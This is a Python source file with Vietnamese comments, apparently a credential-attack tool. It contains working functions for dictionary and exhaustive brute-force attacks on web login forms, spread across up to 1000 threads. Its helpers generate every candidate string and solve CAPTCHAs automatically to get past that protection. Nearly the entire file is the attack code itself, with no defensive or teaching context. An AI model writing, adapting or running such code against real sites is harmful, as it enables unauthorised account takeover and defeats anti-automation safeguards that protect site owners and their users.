import requests 
import concurrent.futures
from bs4 import BeautifulSoup
import string
import threading
import itertools
from solve_captcha_ import solve_captcha

def captcha(target, captcha_path):
    response = requests.get(target, stream=True)
    soup = BeautifulSoup(response.content, 'html.parser')
    img_data = requests.get(captcha_path).content
    return solve_captcha(img_data)

def brute_force_string(length, options=[]):
    datas = ""
    if options[0]:
        datas += string.digits
    if options[1]:
        datas += string.ascii_letters
    if options[2]:
        datas += string.punctuation

    if not datas:
        raise ValueError("Phải chọn ít nhất một loại ký tự.")
    return [''.join(p) for p in itertools.product(datas, repeat=length)]
    


def dictionary_atatck(target, headers, username_list, password_list, captcha_path=None, filter=None):
    
    results = {}
    def try_login(url, username, password):
        
        if captcha_path:
            num_captcha = captcha(target, captcha_path)
            if num_captcha is None:
                return False
            response = requests.post(url, data={'username': username, 'password': password, 'captcha': num_captcha}, headers=headers)
        else:
            response = requests.post(url, data={'username': username, 'password': password}, headers=headers)

        if response.text.find(filter) != -1:  # Nếu đăng nhập thành công
            results[username] = password
            return True
        return False
    
    with concurrent.futures.ThreadPoolExecutor(max_workers = 1 if filter else 1000) as executor:
        futures = []
        for u in username_list:
            for p in password_list:
                futures.append(executor.submit(try_login, target, u, p))

        concurrent.futures.wait(futures, return_when=concurrent.futures.FIRST_COMPLETED)
    return results
    

def bruteforce_attack(target, headers, account, password, username_length, password_length, username_opts, password_opts, captcha_path=None, filter=None):
    results = {}
    found_event = threading.Event()

    def try_login(url, username, password):
        if found_event.is_set():
            return False

        if captcha_path:
            num_captcha = captcha(target, captcha_path)
            if num_captcha is None:
                return False
            response = requests.post(url, data={'username': username, 'password': password, 'captcha': num_captcha}, headers=headers)
        else:
            print(f"Trying {username} with password {password}")
            response = requests.post(url, data={'username': username, 'password': password}, headers=headers)

        if response.text.find(filter) != -1:
            results[username] = password
            found_event.set()
            return True
        return False

    with concurrent.futures.ThreadPoolExecutor(max_workers=1 if filter else 1000) as executor:
        username_list = [account] if account else brute_force_string(username_length, username_opts)
        password_list = [password] if password else brute_force_string(password_length, password_opts)

        future_to_cred = {}
        for u in username_list:
            for p in password_list:
                if found_event.is_set():
                    return results
                future = executor.submit(try_login, target, u, p)
                future_to_cred[future] = (u, p)

        for future in concurrent.futures.as_completed(future_to_cred):
            if future.result():  
                return results  

    return results
    


    
    
